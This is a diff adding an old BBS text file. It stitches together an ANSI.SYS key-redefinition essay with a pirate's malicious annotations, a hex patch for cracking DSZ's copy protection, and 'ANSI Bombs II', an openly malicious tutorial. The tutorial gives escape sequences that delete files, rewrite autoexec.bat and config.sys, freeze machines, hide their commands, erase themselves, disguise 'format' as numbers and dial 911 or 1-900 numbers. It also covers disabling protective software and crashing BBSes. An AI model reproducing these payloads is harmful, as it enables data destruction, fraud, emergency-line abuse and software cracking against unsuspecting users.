@@ -1,0 +1,866 @@
+Name:    How to make ANSI Trojens
+Date:    8/27/89
+Time:    10:19 pm
+
+Press [Ctrl-X] to abort or [Ctrl-S] to pause!
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+                            USING THE ANSI DRIVER
+                              [TO MAKE TROJENS]
+ 
+                                      by
+ 
+                                C. Scot Giles
+                               875 Lake Street
+                          Oak Park, Illinois   60301
+ 
+                        [Turned Pirate By Toilet Scum]
+[All text in [] has been added by Toilet Scum, leader of AAD (Alliance Against]
+[DUNE), WITHOUT the consent of the author!]
+ 
+This essay is an attempt to explain how I use the ANSI.SYS driver to configure
+the function keys on my computer, and to control the screen.  I have used
+these techniques on my PC and AT for years, and find them to be convenient and
+effective.  ANSI is not widely used by microcomputer fans because the
+documentation supplied by IBM on how to send control codes to the ANSI driver
+is among the most cryptic ever produced by IBM.  I learned them by reading
+computer magazines, and slowly figured out how it could be done.  I am not a
+professional computer programmer (indeed I am a clergyman), so some of my
+                                                ^^^^^^^^^ [And i'm a Pirate]
+technical observations might be in error.  But everything here works, and I
+have retested it before finishing this essay.
+ 
+This essay covers only IBM Personal Computers (PC, XT or AT) running DOS 2.n
+or greater.  I have no experience with compatibles, so you are on your own if
+you try to use these techniques on one.
+ 
+                           LOADING THE ANSI DRIVER
+ 
+In order to use any of the techniques in this essay, you must first have
+loaded the ANSI.SYS driver into your computer's memory using your CONFIG.SYS
+file.  You do this my adding the line, DEVICE=ANSI.SYS somewhere in the
+CONFIG.SYS file and rebooting your computer.
+ 
+[My intellegance was insulted here]
+ 
+                       KEYBOARD REASSIGNMENT WITH ANSI
+ 
+ 
+Before we get to specific ways to send control codes to the (now loaded) ANSI
+driver, you must first know what those codes mean.  For the function keys the
+codes are listed on the chart below which first appeared in SOFTALK magazine.
+Each function key is assigned an "extended function code" which DOS will use
+to recognize that a function key has been pressed and in what shifted mode, if
+any.  Each number is expressed as a 0 followed by a semi-colon, then the
+number from the chart below.
+ 
+                KEY     NORMAL  SHIFT   CONTROL  ALT
+                F1      59      84      94      104
+                F2      60      85      95      105
+                F3      61      86      96      106
+                F4      62      87      97      107
+                F5      63      88      98      108
+                F6      64      89      99      109
+                F7      65      90      100     110
+                F8      66      91      101     111
+                F9      67      92      102     112
+                F10     68      93      103     113
+ 
+Accordingly, the way to designate the F5 key would be 0;63 while the F10 key
+would be designated by 0;68 or 0;113 if shifted with the ALT key.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+                       Using the ANSI driver, Page -2-
+ 
+ 
+ 
+If you examine the DOS Technical Reference Manual (not the Technical Manual
+for PC hardware), you will find a section on SCREEN/KEYS.  This section was
+contained in the DOS 2.0 documentation, but IBM removed it in later editions.
+Here is a summary of its contents relative to keyboard redefinition.
+ 
+To change one key to have the meaning of another, enter:
+ 
+                                 ESC [#;#p
+ 
+where the first # is the ASCII value of the key being changed and the second #
+is the ASCII value of the new definition.  For example, "A" has the ASCII
+value of 65 and "Q" has the value of 81.  So:
+ 
+                                 ESC [65;81p
+ 
+will result in "A" being redefined as "Q."  It is also possible to redefine a
+key to have the meaning of a string of characters.  This is done by enclosing
+the string in quotes.  So:
+ 
+                                 ESC [65;"Hi there"p
+ 
+would change the "A" key to have the meaning of "Hi there."  If the first
+value for the first # is a 0 however, DOS knows that what is being changed is
+not an ASCII value but the meaning of an extended function code.  So if you
+were to enter:
+ 
+                                 ESC [0;68;"Hi there"p
+ 
+DOS would know to change the meaning of the function key (in this case F10) to
+the sting enclosed in quotes.  This is the key to redefining your function
+keys to perform much used commands: like DIR, CHKDSK, COPY *.* B: etc. or to
+load programs from disk.
+ 
+There is a final trick here.  If you end the escape command sequence with the
+characters ";13p" instead of just "p" the command will self-execute, just as
+if you pressed the [enter] key.
+ 
+The IBM documentation tells the user to preface each command by an ESC
+command, and I have represented this in the above paragraphs by writing the
+characters "ESC." at the start of each control code sequence mentioned.  Most
+users assume that this means to press the ESC key on the keyboard when
+entering the commands.  Not so.  To get the Escape Sequence to the ANSI driver
+you must enter it using a prompt command or write a .COM file.  For example to
+configure the F1 key (extended function code 59) to have the meaning in DOS of
+"autoexec" with an [enter] command at the end of it you cannot type:
+ 
+                                ESC [0;59;"autoexec";13p
+                                           ^^^^^^^^ [Put something useful]
+                                           [here like "Format C:"  Then]
+                                           [redifine his N to Y, Get the]
+                                           [picture?]
+                                                                         
+as the ESC will not be recognized by DOS as an escape sequence.  What DOS will
+recognize as an escape sequence is the characters "$e" although this surely
+looks strange at first.  Users familiar with the PROMPT command will notice
+that the "$" character is what the PROMPT command uses as an escape sequence,
+and that is precisely how we will get the redefinition to be recognized by
+DOS.  If you enter the following command:
+ 
+ 
+ 
+ 
+                                                    
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+                       Using the ANSI driver, Page -3-
+ 
+ 
+ 
+                                PROMPT $e[0;59;"autoexec";13p
+ 
+you will see that it works perfectly.  You now have the secret to redefining
+the function keys in DOS.  Simply write and run a batch file with a list of
+PROMPT commands and you will have done it.  One precaution, ECHO must be ON,
+otherwise DOS will suppress the PROMPT command and the escape sequences will
+not get through.
+ 
+As an example, let's create a batch file called KEYON.BAT that will set F1 as
+EDITOR [enter], F2 as PC-FILE [enter], F3 as PC-CALC [enter], F4 as PC-GRAPH
+[enter], F5 as PC-TALK [enter], F6 as PC-WRITE [enter], F7 as BASICA [enter],
+F8 as DIR without the [enter], F9 to run a batch file called MENUOFF.BAT
+[enter] and F10 to run a batch file called MENUON.BAT [enter].  It would be as
+follows:
+ 
+                echo on
+                PROMPT $e[0;59;"EDITOR";13p
+                PROMPT $e[0;60;"PC-FILE";13p
+                PROMPT $e[0;61;"PC-CALC";13p
+                PROMPT $e[0;62;"PC-GRAPH";13p
+                PROMPT $e[0;63;"PC-TALK";13p
+                PROMPT $e[0;64;"PC-WRITE";13p
+                PROMPT $e[0;65;"BASICA";13p
+                PROMPT $e[0;66;"DIR"p
+                PROMPT $e[0;67;"MENUOFF";13p
+                PROMPT $e[0;68;"MENUON";13p
+                prompt
+                cls
+ 
+You would also want to create another file called KEYOFF.BAT which resets the
+function key definitions to DOS normal.  The format would be:
+ 
+                echo on
+                PROMPT $e[0;59;0;59p
+                PROMPT $e[0;60;0;60p
+                PROMPT $e[0;61;0;61p
+                PROMPT $e[0;62;0;62p
+                PROMPT $e[0;63;0;63p
+                PROMPT $e[0;64;0;64p
+                PROMPT $e[0;65;0;65p
+                PROMPT $e[0;66;0;66p
+                PROMPT $e[0;67;0;67p
+                PROMPT $e[0;68;0;68p
+                prompt
+                cls
+ 
+I should mention that the purpose of the final blank PROMPT command in each of
+these batch files is to reset the DOS prompt to A> or whatever your default
+prompt is.  It serves no redefinition purpose, but does keep the screen
+looking clean.
+ 
+[I have not found any good uses for this Prompt stuff, but if you find any]
+[let me know]
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+                       Using the ANSI driver, Page -4-
+ 
+ 
+                     USING DEBUG TO LOAD THE ANSI DRIVER
+ 
+[Using this method you can Write COM files that that contain ANSI trojens,]
+[VERY Useful]
+ 
+While there is no reason why we could not continue to configure our function
+keys by batch files consisting of lists of PROMPT commands, this is a clumsy
+way to proceed.  It is easier to use the DEBUG utility supplied with DOS to
+create a .COM file that will do the job for us quickly and directly, without
+sending any input to screen.  To my knowledge this technique was first
+published by Michael J. Grabel in the December 1984 edition of PC WORLD.
+ 
+Place a formatted DOS disk containing the DEBUG utility in the default drive,
+and follow the script below.  As you do so hexadecimal numbers will appear on
+the left hand side of your screen.  These numbers will vary depending on the
+configuration of your system.  For our purposes here I will represent the
+numbers in the form xxxx:nnnn.  What you will see on your screen will be
+different.
+ 
+A>DEBUG [enter]
+-A 100 [enter]
+MOV AH,9 [enter]
+MOV DX,109 [enter]
+INT 21 [enter]
+INT 20 [enter]
+xxxx:nnnn DB 1B'[0;59;"EDITOR";13p' [enter]
+xxxx:nnnn DB 1B'[0;60;"PC-FILE";13p' [enter]
+xxxx:nnnn DB 1B'[0;61;"PC-CALC";13p' [enter]
+xxxx:nnnn DB 1B'[0;62;"PC-GRAPH";13p' [enter]
+xxxx:nnnn DB 1B'[0;63;"PC-TALK";13p' [enter]
+xxxx:nnnn DB 1B'[0;64;"PC-WRITE";13p' [enter]
+xxxx:nnnn DB 1B'[0;65;"BASICA";13p' [enter]
+xxxx:nnnn DB 1B'[0;66;"DIR"p' [enter]
+xxxx:nnnn DB 1B'[0;67;"MENUOFF";13p' [enter]
+xxxx:nnnn DB 1B'[0;68;"MENUON";13p' [enter]
+xxxx:nnnn DB 1B '$' [enter]
+ 
+     As soon as you have entered the previous line, your computer will respond
+     with a number in the form of xxxx:nnnn.  Copy down the portion of the
+     number that is being represented here as "nnnn" as you will need it
+     later.  Once you have copied the number down, press [enter]
+ 
+xxxx:nnnn [enter]
+-N KEYON.COM [enter]
+-R BX [enter]
+ 
+     When you have entered the command above, your computer will respond with
+     the following line and a colon as a prompt.  At this prompt enter 0 and
+     press [enter].
+ 
+BX:0000
+:0 [enter]
+-R CX [enter]
+ 
+     When you enter the R CX command above, the computer will respond with the
+     following line and a colon as a prompt.  At this prompt enter the number,
+     "nnnn" you copied down above and press [enter].
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+                       Using the ANSI driver, Page -5-
+ 
+ 
+CX 0000
+:nnnn [enter]
+-W [enter]
+ 
+     The computer will respond with the following.
+ 
+WRITING nnnn bytes
+-Q [enter]
+ 
+As soon as you enter the Q command (for Quit) you will be back at the DOS
+prompt, and there will be a new file on disk called KEYON.COM.  Simply type it
+at the DOS prompt and your function keys will be configured.  It is a good
+idea to use this same procedure to write another .COM file called KEYOFF.COM
+which will restore the keys to their native DOS definitions.  The procedure
+for this is the same as the above, except that the definition section should
+be:
+ 
+xxxx:nnnn DB 1B'[0;59;0;59p' [enter]
+xxxx:nnnn DB 1B'[0;60;0;60p' [enter]
+xxxx:nnnn DB 1B'[0;61;0;61p' [enter]
+xxxx:nnnn DB 1B'[0;62;0;62p' [enter]
+xxxx:nnnn DB 1B'[0;63;0;63p' [enter]
+xxxx:nnnn DB 1B'[0;64;0;64p' [enter]
+xxxx:nnnn DB 1B'[0;65;0;65p' [enter]
+xxxx:nnnn DB 1B'[0;66;0;66p' [enter]
+xxxx:nnnn DB 1B'[0;67;0;67p' [enter]
+xxxx:nnnn DB 1B'[0;68;0;68p' [enter]
+xxxx:nnnn DB 1B '$' [enter]
+ 
+If you find that KEYON.COM doesn't work correctly, reboot the machine to clear
+the definitions and try again.  The most common mistakes are typing errors (I
+often enter a colon when I wanted a semi-colon).  Another source of difficulty
+will arise if you have another file on disk to start with called KEYON.COM or
+KEYOFF.COM.  DEBUG bypasses the normal file allocation of DOS and writes
+directly to the disk.  If you have another file on disk with the same name,
+DEBUG will overwrite it, but unless the other file was exactly the same size
+as the new one or smaller, there may be a piece of the old file left over
+attached to the end of the new one.  As a precaution, always erase old
+versions of the .COM files, or better yet give each one a unique name and
+rename it later using the DOS Rename command.
+ 
+                            SOME ADDITIONAL TRICKS
+ 
+[How to make your Trojens PRETTY??]
+ 
+ 
+Here are some additional control codes for the ANSI driver, summarized from
+the IBM material.
+ 
+ 
+1. CURSOR POSITIONING
+ 
+     To move the cursor to a specified position: ESC [#;#h where the first #
+     is the desired line number and the second the desire column.
+ 
+     To move the cursor up without changing columns: ESC [#a where # specifies
+     the number of lines moved.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+    
+
+                    DSZ UNPROTECT FOR .EXE OR .COM VERSIONS
+
+           The following DEBUG listing should aid most people familiar with
+        any type of byte editor in removing the opening and closing screens
+        and also enable the enhanced features of DSZ.COM or DSZ.EXE .
+      *** IT WILL WORK WITH >ANY< VERSION, EXE OR COM THAT I HAVE TRIED.***
+        DSZ is an excellent multiple protocol program which can be added to
+        many terminal programs with very little effort and with excellent
+        results. ZMODEM is the ultimate choice of this programmer for many
+        reasons. Here are just a few of the Best Features.
+
+                1.Crash recovery is great for those lousy phone lines
+                  that have a tendency to lose connection 5 minutes into a
+                  6 minute download. Just call back and it will pickup
+                  right where it left off which means saving BIG $$$$$
+                  compared to starting all over which makes Ma Bell BIG $$.
+
+                2.Automated filename transfer which saves having to double
+                  type in filenames. Just tell the BBS to send using Zmodem
+                  protocol then call up DSZ and it will do the rest.
+
+                3.Greatly increases efficiency in transfer rates and the
+                  reliability of what is sent is what you receive. It uses
+                  32-bit CRC error checking and is not unusual to get as
+                  much as 239 CPS from a 2400 baud modem.
+
+        The following are debug hex dumps of .COM and .EXE versions which
+   as you will notice are very similar in the areas listed below.
+        Directly following the copyright notice you will find 6 00's as
+   soon as you locate these (which was the same address for every
+   .COM version I checked and respectivly for every .EXE verison) all
+   you need to do is change 4 of the 6 (the first 2 and last 2) as follows.
+
+
+ --------< 64 1A{00 00 00 00 00 00}FF FF
+|               ^|| || || || || ||^
+|                91 14 00 00 CF 16
+|
+|
+|
+|
+|                         DSZ.COM
+|
+| ????:0180  90 90 90 90 C3 43 6F 70-79 72 69 67 68 74 20 31   .....Copyright 1
+| ????:0190  39 38 34 2C 20 31 39 38-38 20 4F 6D 65 6E 20 54   984, 1988 Omen T
+| ????:01A0  65 63 68 6E 6F 6C 6F 67-79 20 49 6E 63 20 41 6C   echnology Inc Al
+| ????:01B0  6C 20 52 69 67 68 74 73-20 52 65 73 65 72 76 65   l Rights Reserve
+>>????:01C0  64 1A{00 00 00 00 00 00}FF FF 1E 06 55 56 57 F6   d...........UVW.
+| ????:01D0  06 D9^A2 FF 74 1C B8 00^10 CD 16 A3 DC A2 3D 00   ....t.........=.
+| ????:01E0  10 74 0F 3C E0 75 12 88-26 DB A2 8A C4 B4 02 EB   .t.<.u..&.......
+|
+|
+|                         DSZ.EXE
+|
+| ????:0110  90 90 90 90 90 90 C3 43-6F 70 79 72 69 67 68 74   .......Copyright
+| ????:0120  20 31 39 38 34 2C 20 31-39 38 38 20 4F 6D 65 6E    1984, 1988 Omen
+| ????:0130  20 54 65 63 68 6E 6F 6C-6F 67 79 20 49 6E 63 20    Technology Inc
+| ????:0140  41 6C 6C 20 52 69 67 68-74 73 20 52 65 73 65 72   All Rights Reser
+>>????:0150  76 65 64 1A{00 00 00 00-00 00}FF FF 1E 06 55 56   ved...........UV
+  ????:0160  57 F6 06 69^00 FF 74 1C-B8 00^10 CD 16 A3 6C 00   W..i..t.......l.
+  ????:0170  3D 00 10 74 0F 3C E0 75-12 88 26 6B 00 8A C4 B4   =..t.<.u..&k....
+
+
+           If this has been a help to you GREAT!!!! if not find a friend
+           that understands this type of hacking and ask for help.
+           Furthermore I do not request anything (i.e. Money, Your first
+           born or otherwise). If you have a guilty conscience about getting
+           something for nothing THEN send a contribution to the AMERICAN
+           CANCER SOCIETY. I'm certain that they can put it to better use
+           than I would.
+                   Using the ANSI driver, Page -6-
+ 
+ 
+ 
+     To move the cursor to a specified horizontal and vertical position: ESC
+     [#;#f where # means first the line number and secondly the column number.
+ 
+     To get a device status report: ESC [6n
+ 
+     To get a cursor position report: ESC [#;#r where the first # specifies
+     the current line and the second # specifies the current column
+ 
+     To move the cursor down: ESC [#b where # specifies the number of lines
+     moved down.
+ 
+     To move the cursor forward: ESC [#C where # specifies the number of
+     columns moved.
+ 
+     To move the cursor backward: ESC [#d where # specifies the number of
+     columns moved.
+ 
+     To save the cursor position: ESC [s and to restore it: ESC [u.
+ 
+2. ERASING
+ 
+     To do a CLS (erase screen move cursor to home position): ESC [2j
+ 
+     To erase from cursor to end of line: ESC [k
+ 
+ 
+3. COLOR GRAPHICS
+ 
+     To set the color/graphics attributes, enter ESC [#;#m where the first #
+     is the desired foreground color and the second is the desired background
+     color.  Select colors from the list below:
+ 
+     30  black foreground
+     31  red foreground
+     32  green foreground
+     33  yellow foreground
+     34  blue foreground
+     35  magenta foreground
+     36  cyan foreground
+     37  white foreground
+ 
+     40  black background
+     41  red background
+     42  green background
+     43  yellow background
+     44  blue background
+     45  magenta background
+     46  cyan background
+     47  white background
+ 
+     To set additional attributes enter: ESC [#m where # is the number of the
+     desired attribute.  Select attributes from the list below:
+ 
+     0  all attributes off (white on black)
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+                       Using the ANSI driver, Page -7-
+ 
+ 
+     1  bold on
+     4  underscore (on IBM Monochrome Display)
+     5  blink
+     7  reverse video
+     8  invisible
+ 
+To give an example of what can be done with these additional codes, a batch
+file called MENUOFF.BAT containing only the line:
+ 
+                        PROMPT $e[2J$e[30;40m$h
+ 
+would blank a color display completely.  It does a CLS, sets the display to a
+black foreground and background and the with the "$h" performs a backspace to
+erase the blinking cursor (the "$h command is documented in the DOS manual
+under PROMPT).  Another batch file called MENUON.BAT containing the lines:
+ 
+      PROMPT $e[0m
+      prompt
+      cls
+ 
+Would reset a color display to restore the screen after MENUOFF.BAT had been
+run.
+ 
+Enjoy ANSI!  It is a wonderful tool, and can be a lot of fun to use.  It's not
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ [It IS a wonderful tool, especially in]
+                                    [The Right (Wrong?) Hands]
+a keyboard enhancer, and if you load it up with too many keyboard
+redefinitions at one time you will run out of environment space.  This is
+                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ [Watch for]
+                                   [This one, If it gives errors, The User]
+                                   [Will be able to tell that ANSI commands]
+                                   [Have been loaded]
+harmless and simply means that ANSI is full.  But it will work fine too.
+
+                  ANSI Bombs II: Tips and Techniques
+
+                                  By
+
+                           The Raging Golem
+
+
+    I. Introduction
+
+    After writing the last file, a lot of people let me know about the
+mistakes I had made.  I guess this file is to clear up those miscon
+ceptions and to let people know about some of the little tricks behind
+ANSI bombing.  Of course, ANSI bombing isn't as dangerous as a lot of
+people make it out to be, but bombs are still fun to make and with a
+little planning deliver some degree of success.  ANSI bombing can
+be dangerous, so I am tired of hearing people say that an ANSI bomb is
+harmless, another misconception I hope to clear up.  Now, most people
+that have spent time experimenting with ANSI bombs probably know most
+of the material in this file, but it might be fun just to read anyway.
+
+    2. Misconceptions
+
+    In my last file, I made three major blunders, or what I would con
+sider to be major blunders.  First, I said that ANSI bombs could be
+used on BBSs to screw people over, but I guess I was wrong.  It was
+pure speculation on what other people had said that made me say that.
+ANSI codes, including those that redefine keys, are sent over the
+lines, but most comm programs don't use ANSI.SYS; they use their own
+version of ANSI, which doesn't support key redefinition.  Some people
+might have a program that supports it, but I haven't seen it yet.  I
+have tested bombs on systems on my own and proved to myself that they
+don't work.  I have also seen people fuck up bombs that would have
+worked by uploading them in a message.  The second misconception is
+that ANSI bombs are dangerous when put into zips.  I haven't really
+tested this out much, but from what I hear with the newer versions of
+PKZIP, you have to specify that you want to see ANSI comments when
+unzipping.  It is unlikely that you would waste your time unzipping
+something again after seeing "Format C:" in the middle of an escape
+code.  I could be mistaken, but I'm pretty sure that I'm right. Third,
+the last thing that was a misconception is that VANSI.SYS will protect
+your system from key redefinition.  Maybe the newer versions don't
+support key redefinition, but mine sure as hell does.  There are pro
+grams out there that don't support it, but I don't know any of the
+names.  Of course, if I were you, I would be wary about using some
+thing other then ANSI.  I have a few friends that are working on "A
+Better ANSI" for PDers, which, instead of being better, really screws
+them over.
+
+    3. An Overview
+
+    Now, in case you haven't read my other file (it's called ANSI.DOC,
+kind of lame but fairly informative), I'll briefly go over the struc
+ture of an ANSI bomb.  Skip this part if you know what an ANSI bomb is
+and how to make one.
+    In ANSI everything is done with a system of escape codes.  Key
+redefinition is one of those codes.  (From now, whenever I say ESC, I
+really mean the arrow, ).  Here is a basic command:
+                          ESC [13;27p
+    This would make the  key (13 is the code for enter) turn
+into the  key (27 is the code for escape).  The  always has to
+be there, as do the bracket and the "p", but what is between the
+bracket and the "p" is up to you.  The first number is always the key
+that you want to be redefined.  If there is a zero for the first num
+ber, that means the key is in the extended set, and therefore, the
+first two numbers are the code.  The bracket signifies the beginning
+of the definition, and the "p" signifies the end.  Whenever you want a
+key pressed, you have to use it's numerical code (i.e. 13 is the code
+for ).  You can't redefine strings, but you can redefine a key
+to become a string (i.e. ESC [13;"Blah"p would make  say
+"Blah").  Strings must be inside of quotes, which includes commands
+that you want typed on the DOS prompt (i.e. ESC [13;"Del *.*";13p
+would delete everything in the directory, note that 13 stands for
+Enter in this case, not the redefinition).  An escape code can have
+as many commands as you want in it, but each one has to be separated
+by a semi-colon.  You can only redefine one key in each escape code,
+so if you want to redefine another key, you have to start another
+escape code.  That's about it when it comes to bombs, now that you
+have the basics, all you really need is a little imagination.
+
+    4. Tips and Tricks
+
+    A. The Y/N Redefinition
+
+    Now, here's a simple but fun little ANSI bomb:
+
+                   ESC [78;89;13p ESC [110;121;13p
+
+    Basically, all this does is turn a capital "N" into "Y" and a
+lower-case "n" into "y".  Alone this doesn't do too much, except for
+screw around with what they are typing.  On the other hand, try adding
+this line of code to the ANSI bomb:
+
+                   ESC [13;27;13;"del *.*";13p
+
+    Most people would automatically press "N" when they see "Del *.*",
+but when they do, they will be screwed over.  This portion of a bomb
+is very useful when it comes to making good bombs.
+
+    B. Screwing with the Autoexec.bat
+
+    Here is another line of code that you may find useful in future
+bombing projects:
+
+                   ESC [13;27;13;"copy bomb.ans c:\";13;"copy con
+                     c:\autoexec.bat";13;"type bomb.ans";13;0;109;
+                     13;"cls";13p
+
+    This line of code makes the bomb a little more permanent and a
+little more dangerous.  It copies the bomb into the root directory,
+then it change/creates the autoexec.bat, so the bomb is typed after
+every boot-up.  Of course, the person could just boot off a disk, but
+I'm sure this would get them a few time.  It could also probably
+appear as though it were a virus, scaring the shit out of the owner of
+the computer.
+
+    C. Turning Commands into Other Commands
+
+    One of the best pranks to do to someone using an ANSI bomb is to
+redefine commands.  That way if they type in "copy", it will turn into
+"Del *.*".  Since you can't actually change the whole string, you have
+to take a different approach.  You have to change a few of the keys,
+so when typed, they type and execute the desired command.  I guess it
+would be coolest to have to command exactly the same length; that way
+you could redefine one key at a time to obtain the desired effect.
+It doesn't really matter how you do it, just as long as it works.  You
+might make an ANSI that says "Wow, check out what this bomb did to
+your directory", and then have it redefine the keys, so when they type
+in "dir", it turns into "del".  I think you get the idea.
+
+    D. Covering Your Tracks
+
+    This can be kind of useful, if you don't want the bomb to remain,
+once it has been set off.  Here's the command you can stick in your
+bomb, so that it will delete itself.  This is also useful if you want
+a person to think they've been hit by a virus.
+
+    ESC[13;"delete bomb.ans";13p
+
+    Or to make it look like a virus:
+
+    ESC[13;"echo You've been hit by the Big B Virus";13;"delete bomb.ans
+    ";13p
+
+    The second one is a little more fun, but they both get the point
+across.
+
+    E. Screwing with the CONFIG.SYS
+
+    Put in a line like this:
+
+    ESC[13;"^C";13;"copy con c:\config.sys";13;"device=config.sys";13;
+    0;64;13p
+
+    This will change the config.sys, so when they reboot or you force
+them to, the computer will just freeze, and they won't know what hap
+pened.  The CONFIG.SYS will be caught in a loop, and the only way to
+fix it is by booting off a floppy.  Alone it works well, but it's
+better if you also freeze there computer, so they are forced to
+reboot.
+
+    F. Freezing the Computer
+
+    When you create a program with only � and � (ALT-250 and ALT-244
+on the numeric keypad), then the computer will freeze and lock up.  So
+here's a line you can incorporate:
+
+    ESC[13;"^C";13;"copy con blah.com";13;"��";13;0;64;13;"blah";13p
+
+    This will create the necessary program and then run it, freezing
+the computer and forcing a reboot.
+
+    G. Hide Commands
+
+    Hiding commands can serve two purposes.  First, they can freak a
+person out, making them think they're computer has frozen (not too
+useful).  Second, they can hide the commands of the ANSI bomb, which
+can be very useful with longer ANSI bombs.
+    Here is an example of the first:
+
+    ESC[13;"^C";13;"command >nul";13p
+
+    This will make it so all of the commands are invisible, but it
+will relay the error messages (This doesn't work too well with other
+ANSI commands, so just use it alone as a single ANSI bomb).
+    Here is an example of the second:
+
+    ESC[13;"^C";13;"prompt $e[0;30m";13;"cls";13p
+
+    This command will change the color of the text, so it is the same
+as the back ground.  Therefore, all other commands in the ANSI bomb
+will be hidden, and the harm will be done before the victim knows what
+is happening.  This is very helpful and highly recommended to be used
+in all of your ANSI bombs.
+
+    H. Modem Fun
+
+    One of the more interesting things you can do with an ANSI bomb is
+issue commands directly to the modem from the DOS command line.  You
+sort of have to guess on which port their modem is (most likely it is
+either COM1 or COM2, but to be safe you can do them both).  Here's the
+line for the command, then we will talk about some of the fun you can
+have:
+
+    ESC[13;"^C";13;"ECHO ATDT911>COM1";13p
+
+    This command would call 911 through the COM1, but COM1 can be
+replaced by any other com port, 911 can be replaced with any other
+phone number, and ATDT can be replaced with any other modem command.
+The most fun comes in when you play around with the number to dial.
+Instead of 911, which is fairly nasty in its own right, you could put
+a LD number or a 1-900 (especially those that charge a flat rate of
+$25 or so, like the gambler's hotline type thing).  Not only can you
+make the person feel like a fool, but you could also make them a tad
+bit poorer.  When used in conjunction with the freeze command, the
+person probably won't have enough time to turn off the computer before
+they are charged.
+
+    I. Trojans
+
+    By now, everybody knows what a Trojan is.  You probably wouldn't
+think so, but ANSI bombs can be used as Trojans and in Trojans. First,
+if you are planning on crashing a board, but you're not very good at
+programming, then make yourself an ANSI bomb.  Try to find out in
+which directory the main files for running the BBS are stored. They
+are usually under the name BBS or the name of the software, like WWIV
+or Telegard.  Then, make a bomb that either just deletes all the files
+in that directory, or if you want the board to be down a longer time,
+then make one that formats the Hard Drive.  In this form ANSI bombs,
+if they are well planned out, can be easy to make Trojans. Second,
+ANSI bombs can used in Trojans.  This is probably stretching it a
+little, but say you wanted to write a Trojan that would delete a
+directory, every time you typed a certain key, then you could use an
+ANSI bomb.  First make some batch and com/exe files that would search
+for protecting programs like Norton and turn them off.  Then you could
+copy the file into the root directory, along with your versions of
+autoexec.bat, config.sys, ANSI.sys, and whatever else.  (To make it
+look more realistic make the files Resource.00x to trick the user,
+then when copying, use the real name).  Then somehow lock the computer
+up or do a warm boot through some pd program, which is easily attain
+able.  When the computer loads back up, you can screw that shit out of
+them with your ANSI bomb.
+
+    J. The Average Joe
+
+    Ok, now the average Joe is not going to know what the hell is going
+on when he sees all of the escape commands, if he looks at it in something
+that doesn't support ANSI.  He will however be supicious if he sees "format
+C:".  There is is a way to get rid of this.  Instead of redefining the
+key to be a text statement, redefine it as a bunch of keys that do the same
+job.  For example:
+
+      "DELETE" = 100;101;108;101;116;101
+                  D   E   L   E   T   E
+
+      "FORMAT" = 102;111;114;109;97;116
+                  F   O   R   M  A   T
+
+    In this way, you can make destructive commands look like just a bunch
+of numbers.  Very few people will scrutinize an ANSI enough before viewing
+it to see the redefinition command.  This is very helpful and it is another
+trick I recommend you always try to use.
+
+    5. Conclusion
+    It would seem to some people that ANSI bombs are very dangerous,
+and to others that they are stupid or lame.  Personally, I think that
+ANSI bombs are just plain old fun.  They're not too hard to make, but
+there is a lot that you can do with them.  They are nowhere near as
+malicious as virii, so if you're looking for unstoppable destruction,
+look elsewhere, but they do serve their purpose.  I know that there
+are programs out there that help you program ANSI bombs, but I think
+that they kind of take the fun out of them.  Probably, some day soon,
+I'll quit making ANSI bombs and start looking more into virii and pure
+Trojans.  But for now, ANSI bombs suit my purpose.
+
+                               -TRG
+
+    Appendix A: Key Code Program
+
+    Here is a small program, which I find very helpful.  After loading
+it up, it tells you the numeric code for every key you type in.  Spe
+cial means that it is in the extended set and therefore uses zero, and
+"q" ends the program.  Unfortunately,  I can't take any credit for
+this program.  I got it over the phone from Heavymetl, and it was made
+by his brother.  So many thanks go out to Heavymetl and his brother,
+even though they'll probably be a little pissed at me for including
+this in my file.  It is in Pascal and can be compiled in most Turbo
+Pascal compilers.
+
+    Use CRT;
+    Var
+      CH : CHAR;
+    Begin
+      Repeat
+        CH := ReadKey;
+        If CH = #0 then
+          Begin
+            CH := ReadKey;
+            WriteLn(CH,'(Special) - ',ORD(CH));
+          End
+        Else
+          WriteLn(CH,' - ',ORD(CH));
+      Until
+        CH = 'q';
+    End.
+
+
+    Thanks go out to:
+
+    Heavymetl for giving me ideas.  Weapons Master for helping me out
+and giving me input.  And everyone who has helped me along the way.
+
+    If you want to reach me for some reason, just keep your eyes open
+for me on some of the nets.  I'm not too hard to find.
+
+
+X-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-X
+
+ Another file downloaded from:                               NIRVANAnet(tm)
+
+ & the Temple of the Screaming Electron   Jeff Hunter          510-935-5845
+ Rat Head                                 Ratsnatcher          510-524-3649
+ Burn This Flag                           Zardoz               408-363-9766
+ realitycheck                             Poindexter Fortran   415-567-7043
+ Lies Unlimited                           Mick Freen           415-583-4102
+
+   Specializing in conversations, obscure information, high explosives,
+       arcane knowledge, political extremism, diversive sexuality,
+       insane speculation, and wild rumours. ALL-TEXT BBS SYSTEMS.
+
+  Full access for first-time callers.  We don't want to know who you are,
